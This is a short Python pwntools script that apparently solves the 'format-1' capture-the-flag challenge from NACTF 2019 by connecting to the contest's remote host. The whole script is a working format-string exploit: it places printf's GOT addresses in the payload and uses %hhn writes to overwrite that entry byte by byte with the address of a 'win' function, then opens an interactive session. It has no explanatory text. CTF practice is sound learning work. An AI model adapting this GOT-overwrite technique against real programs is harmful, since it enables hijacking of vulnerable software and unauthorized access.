from pwn import *

#p=process('format-1')
p=remote('shell.2019.nactf.com', 31560)

#raw_input()

printf_got = 0x804c00c

win = p32(0x080491b2)

payload = p32(printf_got)+p32(printf_got+1)+p32(printf_got+2)+p32(printf_got+3)
payload += "%" + str(0xb2-16)+"c" 
payload += "%4$hhn"
payload += "%" + str(256+0x91-0xb2)+"c" 
payload += "%5$hhn"
payload += "%" + str(512+0x4-(256+0x91))+"c"
payload += "%6$hhn"
payload += "%" + str(512+0x8-(512+0x4))+"c"
payload += "%7$hhn"

p.sendlineafter('something>', payload)

p.interactive()
